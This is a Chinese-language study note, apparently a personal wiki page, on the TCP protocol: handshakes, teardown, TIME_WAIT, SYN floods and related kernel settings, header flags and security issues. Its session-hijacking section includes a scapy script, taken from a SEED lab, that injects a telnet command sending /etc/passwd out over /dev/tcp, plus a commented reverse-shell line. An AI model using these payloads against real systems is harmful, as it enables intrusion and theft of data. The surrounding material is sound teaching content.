<!DOCTYPE html>
<html lang="en">
<head>
<!-- 2022-11-21 Mon 22:08 -->
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>TCP</title>
<meta name="author" content="Honbey Zhang" />
<meta name="generator" content="Org Mode" />
<link rel="stylesheet" href="../resources/orgmode.css" type="text/css"/>
                     <link rel="stylesheet" href="../resources/style.css" type="text/css"/>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        displayAlign: "center",
        displayIndent: "0em",

        "HTML-CSS": { scale: 100,
                        linebreaks: { automatic: "false" },
                        webFont: "TeX"
                       },
        SVG: {scale: 100,
              linebreaks: { automatic: "false" },
              font: "TeX"},
        NativeMML: {scale: 100},
        TeX: { equationNumbers: {autoNumber: "AMS"},
               MultLineWidth: "85%",
               TagSide: "right",
               TagIndent: ".8em"
             }
});
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS_HTML"></script>
</head>
<body>
<div id="content" class="content">
<header>
<h1 class="title">TCP</h1>
</header><p>
常见相关问题：
</p>
<ul class="org-ul">
<li>TCP 基础
<ul class="org-ul">
<li>TCP 头格式</li>
<li>为什么需要 TCP 协议？</li>
<li>什么是 TCP ？什么是 TCP 连接？</li>
<li>如何唯一确定一个 TCP 连接？</li>
<li>有一个 IP 的服务器监听了一个端口，它的 TCP 最大连接数是多少？</li>
<li>UDP 和 TCP 有什么区别呢？分别的应用场景是？</li>
<li>为什么 UDP 头部没有 首部长度 字段，而 TCP 头部有呢？</li>
<li>为什么 UDP 头部有 包长度 字段，而 TCP 头部没有呢？</li>
</ul></li>
<li>TCP 连接建立
<ul class="org-ul">
<li>TCP 三次握手过程和状态变迁？</li>
<li>如何在 Linux 系统中查看 TCP 状态？</li>
<li>为什么是三次握手？不是两次、四次？</li>
<li>为什么客户端和服务器的初始序列号 ISN 是不相同的？</li>
<li>初始序列号 ISN 是如何随机产生的？</li>
<li>既然 IP 层会分片，为什么 TCP 层还需要 MSS 呢？</li>
<li>什么是 SYN 攻击？如何避免 SYN 攻击？</li>
</ul></li>
<li>TCP 连接断开
<ul class="org-ul">
<li>TCP 四次挥手和状态变迁？</li>
<li>为什么挥手要四次？</li>
<li>为什么 TIME_WAIT 等待的时间是 2MSL ?</li>
<li>为什么需要 TIME_WAIT 状态？</li>
<li>如何优化 TIME_WAIT ?</li>
<li>如果已经建立了连接，但客户端突然出现故障怎么办？</li>
</ul></li>
</ul>

<p>
TCP 协议的一些机制？
</p>
<ul class="org-ul">
<li>重传机制
<ul class="org-ul">
<li>超时重传</li>
<li>快速重传</li>
<li>SACK 累积确认</li>
<li>D-SACK</li>
</ul></li>
<li>滑动窗口
<ul class="org-ul">
<li>发送窗口</li>
<li>接收窗口</li>
</ul></li>
<li>流量控制
<ul class="org-ul">
<li>操作系统缓冲区与滑动窗口的关系</li>
<li>窗口关闭</li>
<li>糊涂窗口综合症</li>
</ul></li>
<li>拥塞控制
<ul class="org-ul">
<li>慢启动</li>
<li>拥塞避免</li>
<li>拥塞发生</li>
<li>快速恢复</li>
</ul></li>
</ul>

<blockquote>
<p>
Characteristic:
</p>
<ul class="org-ul">
<li>Sliding Window</li>
<li>Cumulative Acknowledge</li>
<li>Selective Acknowledge</li>
<li>Automatic Repeat reQuest</li>
<li>Flow Contorl</li>
<li>Congestion Control</li>
<li>Additive Increase Multiplicative Decrease</li>
</ul>
</blockquote>

<p>
Capture Packets: <a href="wireshark.html#ID-6e2b5695-8c56-43db-bc20-6a18802ea836">tcpdump</a> &amp;&amp; <a href="wireshark.html#ID-0cab26c8-3627-4e10-a7f9-535945a56511">Wireshark</a>
</p>

<p>
RFC:
</p>
<ul class="org-ul">
<li><a href="https://datatracker.ietf.org/doc/html/rfc793-">RFC793</a></li>
</ul>

<div id="outline-container-orgda6f289" class="outline-2">
<h2 id="orgda6f289">TCP Connection</h2>
<div class="outline-text-2" id="text-orgda6f289">
<p>
IP 协议是不可靠的，不保证网络包的交付、按序交付和数据的完整性，所以出现了 TCP 这个用于可靠数据传输的协议，能确保接收端接收到的网络包是无损坏、无间隔、非冗余和按序的。
总的来说， TCP 是 <b>面向连接的</b> 、 <b>可靠的</b> 、 <b>基于字节流</b> 的传输层通信协议。
</p>
<ul class="org-ul">
<li>面向连接：一对一连接</li>
<li>可靠：网络链路无论出现了链路变化， TCP 能保证报文到达接收端</li>
<li>字节流：消息是没有边界的，可以传输任意大的消息。消息是有序的，当前一个消息没有收到的时候，即使先到了后面的字节，也不能交给应用层去处理，同时丢弃重复报文</li>
</ul>

<blockquote>
<p>
连接建立后，操作系统分配两个缓冲区：发送缓冲区和接收缓冲区。TCP是双工的，两端可以发送和接收数据。一旦数据放入接收缓冲区，它们会被合并成一条数据流，数据包边界将会消失。只管往缓冲区里写数据，剩下交给操作系统处理。
</p>
</blockquote>

<blockquote>
<p>
Connections:
The reliability and flow control mechanisms described above require
that TCPs initialize and maintain certain status information for
each data stream. The combination of this information, including
sockets, sequence numbers, and window sizes, is called a connection.
</p>
</blockquote>

<p>
Connections: 用于保证可靠性和流量控制维护的某些状态信息。这些信息的组合，包括 Socket 、序列号和窗口大小称为连接。
</p>
<ul class="org-ul">
<li>Socket：由 IP 地址和端口组成</li>
<li>序列号：解决乱序问题</li>
<li>窗口大小：流量控制</li>
</ul>

<p>
四元组：源地址、源端口、目的地址、目的端口。
源、目的地址在 IP 头部中，通过 IP 协议将报文发送给对方主机，源、目的端口在 TCP 头部中，告诉 TCP 协议把数据报发给哪个进程。
</p>

<p>
对于服务器来说，通常是监听一个服务端口，等待客户端的连接，理论上最大的 TCP 连接数为：客户端 IP 数 x 客户端端口数 (2^32 x 2^16) ，但受限于文件描述符（ulimit）和内存限制。
</p>

<p>
相对于 UDP 协议只提供了无连接的、简单的通信服务（数据报由源端口、目的端口、包长度、检验和、数据组成）， TCP 协议更可靠。
</p>
<ul class="org-ul">
<li>连接： TCP 面向连接，传输数据前先要建立连接； UDP 不需要连接，即刻传输数据</li>
<li>服务对象： TCP 是一对一的两点服务； UDP 支持一对一、一对多、多对多的交互通信</li>
<li>可靠性： TCP 是可靠交付数据，数据可以无差错、不丢失、不重复、按需到达； UDP 尽最大努力交付，不保证可靠交付</li>
<li>拥塞控制、流量控制： TCP 有拥塞和流量控制，保证数据传输的安全性； UDP 没有，不管这些</li>
<li>首部开销： TCP 首部长度较长，不启用 option 字段时是 20 字节； UDP 首部只有固定不变的 8 字节</li>
<li>传输方式： TCP 是流式传输，没有边界，保证顺序和可靠； UDP 是一个包一个包的发送，有边界，可能丢包和乱序</li>
<li>分片不同： TCP 的数据如果大于 MSS ，则会在传输层进行分片，接收端同样需要在传输层组装； UDP 的数据大小如果大于 MTU ，会在 IP 网络层进行分片，丢失需要重传所有的数据报，通常应控制 UDP 报文大小小于 MTU 。</li>
<li>应用场景： TCP 用于可靠性传输，如 FTP 文件传输、 HTTP/1 、 HTTP/2 ； UDP 用于包总量较少和实时性要求较高的服务，如 DNS 、 SNMP 、实时通话、广播通信</li>
</ul>

<p>
TCP 计算负载的数据长度： TCP 数据的长度 = IP 总长度 - IP 首部长度 - TCP 首部长度。 TCP 头部没有包长度字段，而 UDP 有，可能是设计的刚好满足 8 字节的头部长度。
</p>
</div>

<div id="outline-container-org649e366" class="outline-3">
<h3 id="org649e366">半连接队列和全连接队列</h3>
<div class="outline-text-3" id="text-org649e366">
<p>
LISTEN:
<code>Recv-Q</code> 当前全连接队列大小
<code>Send-Q</code> 当前全连接队列最大长度
!LISTEN:
<code>Recv-Q</code> 已收到但未被应用进程读取的字节数
<code>Send-Q</code> 已发送但未收到确认的字节数
</p>

<p>
当半连接队列满了却没有开启 syncookie 时，当全连接队列满了也会丢弃，当 <code>max_syn_backlog - current_queue_len &lt; (max_syn_backlog &gt;&gt; 2)</code> 却没有开启 syncookie 时直接丢弃（或 reset）新的 SYN 报文。
</p>

<p>
开启 syncookie 的话会在收到 SYN 后响应的 SYN + ACK 中附带 SYN cookie （跟 seq 相关），接受到 ACK 时会进行验证，验证成功直接加入全连接队列。
</p>

<p>
<code>TCP_DEFER_ACCPET</code> 可以缓解全连接攻击，接受到第三次握手的 ACK （未附带数据）后还会在 <code>SYNC_RCVD</code> 状态（可以理解为 mini socket），此时连接建立端为 <code>ESTABLISHED</code> 状态，直到对端发送了有效载荷，才调用 <code>accept()</code> 。
</p>
</div>
</div>
</div>
<div id="outline-container-orge2679d1" class="outline-2">
<h2 id="orge2679d1">Handshake</h2>
<div class="outline-text-2" id="text-orge2679d1">
<pre class="example">
Client                   Server
   |     -----SYN----&gt;     |
   |     &lt;--SYN+ACK---     |
   |     -----ACK----&gt;     |
Client                   Server
</pre>
<pre class="example">
SYN_1 : Seq Num = Client_ISN
SYN_2, ACK_1 : Seq Num = Srever_ISN, Ack Num = Client_ISN + 1
ACK_2 : Ack Num = Server_ISN + 1
</pre>

<p>
前两次握手因为是 SYN ，不能携带数据，消耗序列号；第三次握手是 ACK ，可以携带数据，但不带数据的就不会消耗序列号。
查看 TCP 状态： <code>netstat -napt ; ss -natp</code> 。
</p>

<p>
三次握手能保证双方具有发送和接收的能力，且：
</p>
<ul class="org-ul">
<li>三次握手可以阻止重复历史连接的初始化：两次握手不能判断当前连接是否是历史连接，三次握手则可以在客户端准备发送第三次握手报文时有足够的信息判断当前连接是否是历史连接。如果是历史连接，发送 RST 报文终止连接；不是历史连接，发送 ACK 报文以建立连接</li>
<li>三次握手可以同步双方的初始序列号：序列号是可靠传输的关键因素，使得接收方可以去除重复的数据，接收方可以根据序列号按序排列，可以标识发送出去的数据包，哪些是已经被对方收到的。当客户端携带初始序列号的 SYN 报文，服务器回应 ACK 表示客户端的 SYN 已被接收（知道了客户端的初始序列号），同时服务器附带 SYN 发送自己的初始序列号，客户端收到后回应 ACK 表明已收到服务器的 SYN 报文（知道了服务器的初始序列号），这样才保证双方都知道的对方的初始序列号。从这个角度来看，也是协议要求的，即 ACK 确认。</li>
<li>三次握手可以避免资源浪费：二次握手容易造成服务器收到 SYN 就建立连接而造成资源浪费，四次握手的话就是服务器把 ACK 和 SYN 分开发送没必要</li>
</ul>
</div>

<div id="outline-container-org63eee39" class="outline-3">
<h3 id="org63eee39">初始序列号</h3>
<div class="outline-text-3" id="text-org63eee39">
<p>
如果一个已经失效的连接被重用了，但是该旧连接的历史报文还残留在网络中，如果序列号相同，那么就无法分辨出该报文是不是历史报文，而若造成历史报文被新的连接接受了，则会产生数据错乱。
一方面每次建立连接前重新初始化一个序列号主要是为了通信双方能够根据序号将不属于本连接的数据报丢弃。另一方面为了安全性，防止黑客伪造相同的序列号的 TCP 报文从而造成被会话劫持等攻击。
RFC1948 提出了一个较好的初始化序列号 ISN 的随机生成算法： <code>ISN = M + F(localhost, localport, remotehost, remoteport, &lt;secret&gt;)</code>
M 为计时器，计时器每隔 4 毫秒 + 1 （每 4.55 小时转一圈）；
F 为 Hash 算法，根据四元组和可选的秘密生成一个随机数值，算法可以使用 MD5 算法。
</p>
</div>
</div>

<div id="outline-container-orgb7daa9f" class="outline-3">
<h3 id="orgb7daa9f">SYN 攻击</h3>
<div class="outline-text-3" id="text-orgb7daa9f">
<p>
攻击者段时间内伪造不同 IP 地址的 SYN 报文，服务器接收到 SYN 报文进入 SYN_RCVD （半连接）状态，但回应的 SYN + ACK 报文无法得到未知 IP 主机的应答，久而久之占满 SYN 接收队列（未连接队列），导致服务器不能为正常用户服务。
</p>

<p>
Linux 内核参数：
<code>net.core.netdev_max_backlog</code>: 当网卡接收数据包的速率大于内核处理的速度时，会有一个队列保存这个数据包，此值为该队列的最大值
<code>net.ipv4.tcp_max_syn_backlog</code>: <code>SYN_RCVD</code> 状态连接的最大值
<code>net.ipv4.tcp_abort_on_overflow</code>: 超出处理能力时，对新的 SYN 直接响应 RST
</p>

<p>
Linux 处理 TCP 连接的流程：
</p>
<ol class="org-ol">
<li>服务器收到客户端的 SYN ，将其加入内核的 SYN 队列</li>
<li>发送 ACK + SYN 给客户端，等待客户端回应</li>
<li>服务器收到客户端的 ACK ，从 SYN 队列移除并放入到 Accept 队列</li>
<li>应用程序通过调用 <code>accept()</code> socket 接口，从 Accept 队列取出连接</li>
</ol>

<p>
当应用程序过慢时，就会导致 Accept 队列被占满。如果受到 SYN 攻击，会导致 SYN 队列被占满，使用 <code>net.ipv4.tcp_syncookies</code> 应对 SYN 攻击，在 ACK + SYN 报文中附带 SYN Cookie ，不将连接加入 SYN 队列，待到收到客户端的 ACK 报文，验证合法性才将其直接放入 Accept 队列。
</p>
</div>
</div>

<div id="outline-container-org8fe0ec6" class="outline-3">
<h3 id="org8fe0ec6">四次挥手</h3>
<div class="outline-text-3" id="text-org8fe0ec6">
<pre class="example">
      TCP A                                                TCP B

  1.  ESTABLISHED                                          ESTABLISHED

  2.  (Close)
      FIN-WAIT-1  --&gt; &lt;SEQ=100&gt;&lt;ACK=300&gt;&lt;CTL=FIN,ACK&gt;  --&gt; CLOSE-WAIT

  3.  FIN-WAIT-2  &lt;-- &lt;SEQ=300&gt;&lt;ACK=101&gt;&lt;CTL=ACK&gt;      &lt;-- CLOSE-WAIT

  4.                                                       (Close)
      TIME-WAIT   &lt;-- &lt;SEQ=300&gt;&lt;ACK=101&gt;&lt;CTL=FIN,ACK&gt;  &lt;-- LAST-ACK

  5.  TIME-WAIT   --&gt; &lt;SEQ=101&gt;&lt;ACK=301&gt;&lt;CTL=ACK&gt;      --&gt; CLOSED

  6.  (2 MSL)
      CLOSED
</pre>

<p>
主动关闭连接的才有 <code>TIME_WAIT</code> 状态。
</p>

<p>
客户端发送 FIN 表示自己不再发送数据了，但还能接收数据。
四次是为了在服务端收到客户端的 FIN 时，回应 ACK 表示自己知道对方要断开连接，自己 <b>还有数据需要处理和发送</b> ，待服务器也没有数据要发送时，发送 FIN 给客户端表示同意关闭连接。
</p>

<p>
<code>TIME_WAIT</code> 状态需要等待 2 MSL(Maximum Segment Lifetime) 后才进入 <code>CLOSE</code> 状态。
MSL: 报文最大生存时间，指任何报文在网络上存在的最长时间，超过这个时间报文将被丢弃，因为 TCP 基于 IP ，而 IP 头部中有一个 TTL 字段。
TTL: IP 分组可以经过的最大路由数，每被一个路由器处理后， TTL 就减 1 ，当此值为 0 时 IP 分组将被丢弃，同时发送 ICMP 报文通知源主机。
MSL 的单位是秒， TTL 的单位是路由跳数， MSL 要大于 TTL 消耗为 0 的时间。
2MSL: 网络中可能存在来自发送方的数据包，当这些发送方的数据包被接收方处理后又会想对方发送响应，所以一来一回需要等待 2 倍的时间。比如说被动关闭方没有收到断开连接的最后那个 ACK 报文，就会触发超时重发 FIN 报文，另一方收到 FIN 后，重发 ACK 给被动关方，一来一去正好 2 个 MSL 。2MSL 时间是从主动关闭方收到 FIN 后发送 ACK 报文后开始计时的，若又收到了对方的 FIN 而重发 ACK 报文，则重新开始计时。一般 Linux 系统默认 MSL 为 30 秒。
</p>

<p>
<code>TIME_WAIT</code> 可以：
</p>
<ul class="org-ul">
<li>防止具有相同四元组的旧数据包被收到</li>
<li>保证被动关闭一方能被正确的关闭，即保证最后的 ACK 报文能让被动关闭方接收</li>
</ul>

<p>
优化 <code>TIME_WAIT</code> ：
</p>
<ul class="org-ul">
<li>Linux 内核打开 <code>net.ipv4.tcp_tw_reuse, net.ipv4.tcp_timestamps</code>
<code>tcp_rw_resue</code> 功能只能用在客户端（连接发起方），调用 <code>connect()</code> 时，内核随机找一个 <code>TIME_WAIT</code> 状态超过 1 秒的连接给新的连接复用，需配合 timestamp 选项在 TCP 头部的选项里记录 TCP 发送方的当前时间戳和从对端接收到的最新时间戳，由于引入了时间戳，2MSL 问题就可以不用考虑了，因为重复的数据包会因为时间戳过期被丢弃</li>
<li><code>net.ipv4.tcp_max_tw_buckets</code>
一般默认是 18000 ，当系统中处于 <code>TIME_WAIT</code> 的连接超过这个值，系统就会将后面的 <code>TIME_WAIT</code> 连接状态重置，不推荐使用</li>
<li><p>
应用程序使用 <code>SO_LINGER</code> ，强制使用 RST 关闭连接
设置 <a href="20220718-socket.html#ID-8f85e772-fcef-4d79-9314-c30b08caa0b1">Socket</a> 选项调整 close 关闭连接的行为：
</p>
<div class="org-src-container">
<pre class="src src-c"><span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">linger</span> <span style="color: #BA36A5;">so_linger</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
so_linger<span style="color: #333333; background-color: #FFFFFF;">.</span><span style="color: #BA36A5; font-style: italic;">l_onff</span> <span style="color: #0000FF;">=</span> <span style="color: #D0372D;">1</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
so_linger<span style="color: #333333; background-color: #FFFFFF;">.</span><span style="color: #BA36A5; font-style: italic;">l_linger</span> <span style="color: #0000FF;">=</span> <span style="color: #D0372D;">0</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
<span style="color: #006DAF;">setsockopt</span><span style="color: #707183; background-color: #FFFFFF;">(</span>s<span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #D0372D;">SOL_SOCKET</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #D0372D;">SO_LINGER</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #0000FF;">&amp;</span>so_linger<span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #0000FF;">sizeof</span><span style="color: #7388D6; background-color: #FFFFFF;">(</span>so_linger<span style="color: #7388D6; background-color: #FFFFFF;">)</span><span style="color: #707183; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
</pre>
</div>
<p>
如果 <code>l_onoff</code> 非 0 且 <code>l_linger</code> 值为 0 ，那么调用 <code>close()</code> 后，会立即发送一个 RST 给对端，该 TCP 连接将跳过四次挥手，直接关闭。这不符合 TCP 挥手正常关闭连接的初衷，不推荐使用
</p></li>
</ul>
</div>
</div>
<div id="outline-container-orgd4bfc9c" class="outline-3">
<h3 id="orgd4bfc9c">TCP 保活</h3>
<div class="outline-text-3" id="text-orgd4bfc9c">
<p>
定义一个时间段，在这个时间段内，如果没有任何连接相关的活动，TCP 保活机制会开始作用，每隔一个时间间隔，发送一个探测报文，该探测包含的数据非常少，如果连续几个探测保温都没有得到响应，则认为当前 TCP 连接已经死亡，系统内核将错误通知给上层应用程序。
</p>

<p>
Linux 内核相关设置：
</p>
<pre class="example">
net.ipv4.tcp_keepalive_time = 7200 # 保活时间 7200 秒
net.ipv4.tcp_keepalive_intvl = 75  # 检测间隔 75   秒
net.ipv4.tcp_keepalive_probes = 9  # 探测次数 9    次
</pre>
<p>
则需要 7875 秒才发现一个死亡连接。
</p>

<p>
在对端程序正常工作时，会正常响应 TCP 探测报文，从而重置保活时间；
对端程序崩溃重启后，会对 TCP 探测报文响应 RST 报文；
探测报文因为某些原因不可达，多次探测直到最大次数。
</p>
</div>
</div>
</div>

<div id="outline-container-org11b821c" class="outline-2">
<h2 id="org11b821c">MTU MSS</h2>
<div class="outline-text-2" id="text-org11b821c">
<p>
MTU(Maximum Transmission Unit): 一个网络包的最大长度，以太网一般为 1500 字节
</p>

<p>
MSS(Maximun Segment Size)     : 除去 IP 和 TCP 头部后，一个网络包所能容纳的 TCP 数据的最大长度
</p>

<p>
如果 TCP 的整个报文都交给 IP 网络层去分片，那么在 IP 网络层有一个超过 MTU 大小的数据（TCP 头部 + TCP 数据）要发送，IP 网络层就要进行分片，保证每一个分片都小于 MTU ，把一个 IP 分组分片后，由目标主机的 IP 网络层重新组装后，再交给 TCP 协议处理， <b>当一个 IP 分片丢失，整个 IP 分组的所有分片都得重传</b> ，但 IP 协议没有超时重传机制，需要 TCP 负责超时和重传，当接收方没有收到 TCP 报文，则不会响应 ACK 给对方，那么发送方就会根据 TCP 重传机制重发整个 TCP 报文。
</p>

<p>
为了达到最佳的传输效能， TCP 协议在建立连接时通常要协商双方的 MTU 值，当 TCP 层发现数据超过 MSS 时，就会实现进行分片，到了 IP 网络层时 IP 分组的长度不会大于 MTU ，IP 网络层就不会分片了。这样在个别 TCP 分片丢失后，重传这些丢失的分片就行。
</p>

<p>
总结起来就是数据在 TCP 分段，就是为了在 IP 层不需要分片，同时发生重传的时候只重传分段后的小份数据。
</p>
</div>

<div id="outline-container-org7d07e0b" class="outline-3">
<h3 id="org7d07e0b">PMTU</h3>
<div class="outline-text-3" id="text-org7d07e0b">
<p>
Path MTU Discovery: 路径 MTU 发现协议，利用 IP 数据包头的 DF(Don&rsquo;t Fragment) 字段表示不允许分片，这样在链路中遇到路由器的 MTU 小于 IP 报文的长度时，路由器会通过 ICMP 协议通知发送端数据需要分片及自己的 MTU 大小。
</p>
</div>
</div>
</div>

<div id="outline-container-org22ffce3" class="outline-2">
<h2 id="org22ffce3">Header Format</h2>
<div class="outline-text-2" id="text-org22ffce3">
<pre class="example">
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          Source Port          |       Destination Port        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                        Sequence Number                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Acknowledgment Number                      |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Data |           |U|A|P|R|S|F|                               |
   | Offset| Reserved  |R|C|S|S|Y|I|            Window             |
   |       |           |G|K|H|T|N|N|                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |           Checksum            |         Urgent Pointer        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Options                    |    Padding    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                             data                              |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</pre>

<p>
Sequence Number: 建立连接时由计算机生成的随机数作为其初始值，通过 SYN 包传给接收端主机，每发送一次数据就 <b>累加</b> 一次 <b>所发送的数据的字节数</b> 的大小。用来解决网络包乱序问题
</p>

<p>
Acknowledgment Number: 指下一次 <b>期望</b> 收到的数据的序列号（Sequence Number），发送端收到这个确认号以后可以认为在这个序号以前的数据都已被正常接受。用来解决丢包问题。
</p>
</div>

<div id="outline-container-org35097a5" class="outline-3">
<h3 id="org35097a5">Flags</h3>
<div class="outline-text-3" id="text-org35097a5">
<table>
<caption class="t-above"><span class="table-number">Table 1:</span> Function of flags of TCP</caption>

<colgroup>
<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Flag</th>
<th scope="col" class="org-left">Function</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">URG</td>
<td class="org-left">Urgent Pointer field significant</td>
</tr>

<tr>
<td class="org-left">ACK</td>
<td class="org-left">Acknowledgment field significant</td>
</tr>

<tr>
<td class="org-left">PSH</td>
<td class="org-left">Push Function</td>
</tr>

<tr>
<td class="org-left">RST</td>
<td class="org-left">Reset the connection</td>
</tr>

<tr>
<td class="org-left">SYN</td>
<td class="org-left">Synchronize sequence numbers</td>
</tr>

<tr>
<td class="org-left">FIN</td>
<td class="org-left">No more data from sender</td>
</tr>
</tbody>
</table>

<p>
SYN packet can&rsquo;t carry data, but it will consume a sequence number.
ACK packet can carry data, don&rsquo;t consume sequence number if it don&rsquo;t carry data.
</p>
</div>
</div>
</div>

<div id="outline-container-orgcf9c96c" class="outline-2">
<h2 id="orgcf9c96c">TCP 有限状态机</h2>
<div class="outline-text-2" id="text-orgcf9c96c">

<figure id="org98d41f2">
<img src="../images/20220715-tcp_1.png" alt="20220715-tcp_1.png">

</figure>
</div>
</div>
<div id="outline-container-org9bb9f29" class="outline-2">
<h2 id="org9bb9f29">TCP <a href="20220708-information_security.html#ID-f206c9e0-f8d8-4b31-b74e-449365305a46">安全</a>问题</h2>
<div class="outline-text-2" id="text-org9bb9f29">
<p>
在 TCP 协议下，利用伪造的数据包，可以：
</p>
<ul class="org-ul">
<li>提前确认数据，扰乱 TCP 的 ACK 时钟，影响 RTT 测量</li>
<li>乱序确认数据，扰乱 ACK 到达的顺序，影响拥塞控制</li>
<li>确认已丢弃的数据，接受端无法接收到该数据，造成空洞</li>
<li>确认已丢弃的数据，伪造数据弥补空洞实现注入</li>
<li>伪造数据注入，使 SSH, HTTPS 等解密失败， TCP 正常关闭</li>
</ul>
</div>

<div id="outline-container-org39f3f54" class="outline-3">
<h3 id="org39f3f54">会话劫持</h3>
<div class="outline-text-3" id="text-org39f3f54">
<p>
伪造数据包让一方接受这个伪造的数据包的攻击方式，一台计算机可以有多个并发的TCP会话，因此它需要知道一个数据包属于哪一个TCP会话。TCP使用4元组来唯一确定一个会话： 源IP地址、目的IP地址、源端口号、目的端口号，这4个域称为TCP会话的特征。
为了伪造数据包，除了上面四个特征必须符合外，还有一个关键的序列号必须符合。
</p>

<p>
危害：如果接收方是 telnet 服务器，那从发送方到接收方的数据就是命令，一旦控制了该会话，就可以让 telnet 服务器运行攻击者的命令， 这就是把这类攻击称为 TCP 会话劫持的原因。具体是在客户端连接到服务器时，攻击者抓包得到序列号从而伪造数据包。例如：
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #8D8D84; font-style: italic;">#!/usr/bin/env python3</span>
<span style="color: #008000;">'''</span>
<span style="color: #008000;">http://note.blueegg.net.cn/seed-labs/tcp/session-attack/</span>
<span style="color: #008000;">'''</span>
<span style="color: #0000FF;">import</span> sys
<span style="color: #0000FF;">from</span> scapy.all <span style="color: #0000FF;">import</span> <span style="color: #0000FF;">*</span>

<span style="color: #006FE0;">print</span>(<span style="color: #008000;">"SENDING SESSION HIJACKING PACKET....."</span>)
<span style="color: #BA36A5;">client_addr</span> <span style="color: #0000FF;">=</span> <span style="color: #008000;">"192.168.230.151"</span>
<span style="color: #BA36A5;">server_addr</span> <span style="color: #0000FF;">=</span> <span style="color: #008000;">"192.168.230.150"</span>

<span style="color: #BA36A5;">IPLayer</span> <span style="color: #0000FF;">=</span> <span style="color: #D0372D;">IP</span>(<span style="color: #808080;">src</span><span style="color: #0000FF;">=</span>client_addr, <span style="color: #808080;">dst</span><span style="color: #0000FF;">=</span>server_addr)
<span style="color: #BA36A5;">TCPLayer</span> <span style="color: #0000FF;">=</span> <span style="color: #D0372D;">TCP</span>(<span style="color: #808080;">sport</span><span style="color: #0000FF;">=</span><span style="color: #D0372D;">38276</span>, <span style="color: #808080;">dport</span><span style="color: #0000FF;">=</span><span style="color: #D0372D;">23</span>, <span style="color: #808080;">flags</span><span style="color: #0000FF;">=</span><span style="color: #008000;">"A"</span>, <span style="color: #808080;">seq</span><span style="color: #0000FF;">=</span><span style="color: #D0372D;">2833231448</span>, <span style="color: #808080;">ack</span><span style="color: #0000FF;">=</span><span style="color: #D0372D;">1828464701</span>)
<span style="color: #BA36A5;">Data</span> <span style="color: #0000FF;">=</span> <span style="color: #008000;">"</span><span style="color: #0000FF;">\r</span><span style="color: #008000;"> cat /etc/passwd &gt; /dev/tcp/192.168.230.1/9090</span><span style="color: #0000FF;">\r</span><span style="color: #008000;">"</span>
<span style="color: #8D8D84; font-style: italic;"># Data = "\r /bin/bash -i &gt; /dev/tcp/192.168.230.1/9090 2&gt;&amp;1 0&lt;&amp;1 \r" # get shell</span>
<span style="color: #BA36A5;">pkt</span> <span style="color: #0000FF;">=</span> <span style="color: #6434A3;">IPLayer</span><span style="color: #0000FF;">/</span><span style="color: #6434A3;">TCPLayer</span><span style="color: #0000FF;">/</span><span style="color: #6434A3;">Data</span>
<span style="color: #006DAF;">ls</span>(pkt)
<span style="color: #006DAF;">end</span>(pkt, <span style="color: #808080;">verbose</span><span style="color: #0000FF;">=</span><span style="color: #D0372D;">0</span>)
</pre>
</div>
</div>
</div>

<div id="outline-container-org2712a10" class="outline-3">
<h3 id="org2712a10">身份仿冒</h3>
<div class="outline-text-3" id="text-org2712a10">
<p>
C - Sender
</p>

<p>
S - receiver
</p>

<p>
M - hacker
</p>
<ol class="org-ol">
<li>M 对 C 发起 SYN Flood 攻击，使得 C 不可用</li>
<li>M 仿冒 C 的地址对 S 发起连接请求</li>
<li>S 对 C 进行回应，M 无法收到，除非在同网段监听</li>
<li>M 预测 S 的序列号，以此回应 S</li>
<li>S 收到 ACK 回应后任务和 C 建立了连接</li>
</ol>

<p>
M 仿冒 C 的地址与 S 通信，M 虽然不会收到 S 发来的报文，但可以向 S 发送伪造的数据包
</p>
</div>
</div>

<div id="outline-container-org03ec721" class="outline-3">
<h3 id="org03ec721">DoS 攻击</h3>
<div class="outline-text-3" id="text-org03ec721">
<p>
M 可以预测 C 和 S 的序列号，在 C 和 S 的通信过程中，假冒任意一方的 IP 地址，频繁抢先一部发送错误的报文：
</p>
<ul class="org-ul">
<li>发送序列号正确的 ACK 报文，导致很多正确的报文被丢弃， TCP 连接看起来正常，系统处于拒绝服务状态</li>
<li>发送序列号正确的 FIN 报文，导致 TCP 连接关闭，系统处于拒绝服务状态</li>
</ul>
</div>
</div>
</div>

<div id="outline-container-org93a4d16" class="outline-2">
<h2 id="org93a4d16">TCP 重要机制</h2>
<div class="outline-text-2" id="text-org93a4d16">
<p>
